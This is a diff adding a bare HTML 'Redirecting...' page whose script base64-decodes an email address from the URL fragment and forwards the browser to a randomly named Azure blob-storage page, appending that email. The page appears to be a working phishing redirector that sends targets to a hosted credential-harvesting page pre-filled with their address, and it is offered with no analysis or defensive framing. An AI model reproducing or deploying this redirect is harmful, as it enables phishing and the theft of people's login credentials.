@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Redirecting...</title>
+<script> 
+var hash = window.location.hash;
+if(hash !== "") {
+
+    hash = hash.split('#');
+    var email = hash[1];
+    email = atob(email);
+    window.location.href = "https://56tgh65tyhj.blob.core.windows.net/iutrh/DRY.html?sp=r&st=2020-03-24T18:14:42Z&se=2020-04-11T02:14:42Z&spr=https&sv=2019-02-02&sr=b&sig=0KL0sZ3HUS1cvb43Horuimi2vCymJ73jK69JNeQgilM%3D#" + email;
+}
+</script>
+</head>
+
+<body>
+</body>
+</html>
